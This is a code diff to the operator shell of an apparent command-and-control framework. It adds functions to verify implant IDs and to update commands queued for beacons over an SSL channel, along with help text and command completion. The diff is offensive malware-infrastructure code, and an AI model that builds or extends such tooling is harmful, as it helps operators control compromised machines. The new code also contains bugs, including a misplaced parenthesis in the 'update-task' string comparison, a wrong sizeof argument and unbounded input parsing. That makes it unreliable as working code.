@@ -34,7 +34,7 @@ extern "C" {
 }
 
 #define BUFFER_SIZE 0x100
-#define MAX_SIZE 0x20000
+#define MAX_SIZE 0x999999
 #define HELP_SIZE 0x400
 
 char IP[BUFFER_SIZE];
@@ -56,6 +56,7 @@ const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]
                                     "   new-task [task] : Issue new task for the beacon\n"
                                     "   list-tasks : Show all information abouts tasks for beacon\n"
                                     "   response-task [task id] : show response for specific task\n"
+                                    "   update-task [id] [cmd] : update task (only if it is not completed)\n"
                                     "   \n-----------------------------------\n";
 
 
@@ -181,6 +182,74 @@ class Communicate_ {
 
 class SendInfo : public Communicate_ {
     public:
+
+    bool verify_id(const char* id) {
+        cJSON *info = cJSON_CreateObject();
+        if (!info) {
+            return false;
+        }
+        cJSON_AddStringToObject(info, "Info", "verify_implant");
+        cJSON_AddStringToObject(info, "implant_id", id);
+        char *info_ = cJSON_Print(info);
+        //send(sock, info_, strlen(info_), 0);
+        SSL_write(ssl, info_, strlen(info_));
+        
+        cJSON_Delete(info);
+        free(info_);
+
+        char reply[BUFFER_SIZE];
+        SSL_read(ssl, reply, sizeof(reply));
+
+        cJSON *re = cJSON_Parse(reply);
+        if (!re) {
+            printf("\n[-]failed to parse json");
+            return false;
+        }
+        cJSON *valid_id = cJSON_GetObjectItem(re, "valid_id");
+        if (strncmp(valid_id->valuestring, "false", sizeof("false")) ==0) {
+            return false;
+        }
+        return true;
+
+    }
+
+    bool update_task(const char* id, int task_id, const char* command) {
+        cJSON *info = cJSON_CreateObject();
+        if (!info) {
+            return false;
+        }
+        cJSON_AddStringToObject(info, "Info", "implant_id");
+        cJSON_AddStringToObject(info, "implant_id", id);
+        cJSON_AddStringToObject(info, "action", "update-task");
+        cJSON_AddStringToObject(info, "command", command);
+        cJSON_AddNumberToObject(info, "task_id", task_id);
+        char *info_ = cJSON_Print(info);
+        //send(sock, info_, strlen(info_), 0);
+        SSL_write(ssl, info_, strlen(info_));
+        
+        cJSON_Delete(info);
+        free(info_);
+
+        //char reply[BUFFER_SIZE];
+        char reply[BUFFER_SIZE];
+
+        SSL_read(ssl, reply, BUFFER_SIZE-1);
+        
+        cJSON *re = cJSON_Parse(reply);
+        if (!re) {
+            return false;
+        }
+
+        cJSON *update = cJSON_GetObjectItem(re, "update");
+        if (strncmp(update->valuestring, "false", sizeof("return")) == 0 ) {
+            return false;
+        }
+
+
+        return true;
+    
+    }
+
     void new_task(const char *id, const char* command) {
         cJSON *info = cJSON_CreateObject();
         if (!info) {
@@ -357,6 +426,12 @@ class Operator {
 
     public:
     void AgentShell(const char* id, RetriveInfo recvinfo, SendInfo sendinfo) {
+        // verify id
+        if (sendinfo.verify_id(id) == false) {
+            printf("[-] ID does not exist\n[-] Back to Home Shell \n\n");
+            return;
+        }
+
         printf("\n[+] Using Agent ID : %s \n", id);
         // Set up readline for this shell
         rl_attempted_completion_function = beacon_shell_completion;
@@ -381,8 +456,6 @@ class Operator {
             }
 
             add_history(cmd);
-
-
 
             if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1)==0) {
                 printf("\n[-] Back to Home Shell \n\n");
@@ -420,9 +493,22 @@ class Operator {
                 // print this data
                 DisplayCommandResponse(data);
                 free(data);
+            } else if (strncmp(cmd, "update-task", strlen("update-task") == 0)) {
+                int task_id;
+                char command[BUFFER_SIZE];
+                if (sscanf(cmd, "update-task %d %s", &task_id, command) != 2) {
+                    printf("\n[-] MUST HAVE TASK ID AND NEW COMMAND \n [*] update-task [id] [cmd]\n");
+                    continue;
+                }
+                if (sendinfo.update_task(id, task_id, command)) {
+                    printf("\n[+] TASK UPDATED");
+                } else {
+                    printf("\n[-] TASK NOT UPDATED\n");
+                }
+                
             } else if (strncmp(cmd, "whoami", 6) == 0) {
                 printf("%s", current_operator);
-            }else {
+            } else {
                 printf("%s", beacon_shell_help);
             }
 
@@ -514,8 +600,7 @@ int main(int argc, char** argv) {
         if (com.authenticate() == true) {
             break;
         }
-        printf("[-] Failed to authenticate: \n[-] Try Again\n\n");
-        sleep(3); // 
+        printf("[-] Failed to authenticate: \n[-] Try Again\n\n"); 
         tries++;
     } while (tries < 3);
 
@@ -572,10 +657,10 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
     }
     else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0) {
         char id[9];
-        if (sscanf(cmd, "beacon %9s", id) == 1) {
+        if (sscanf(cmd, "beacon %8s", id) == 1) {
             // confirm if id exists
             op.AgentShell(id, recvinfo, sendinfo);
-        } else if (sscanf(cmd, "use %9s", id) == 1) {
+        } else if (sscanf(cmd, "use %8s", id) == 1) {
             op.AgentShell(id, recvinfo, sendinfo);
         }
     } 
@@ -613,7 +698,7 @@ char** shell_completion(const char* text, int start, int end) {
 
 char* command_generator(const char* text, int state) {
     static const char* commands[] = {
-        "implants", "beacon", "list-tasks", "whoami", "exit", "quit", "q", NULL
+        "implants", "beacon", "list-tasks", "whoami", "exit", "quit", "q", "use", NULL
     };
     
     static int list_index, len;
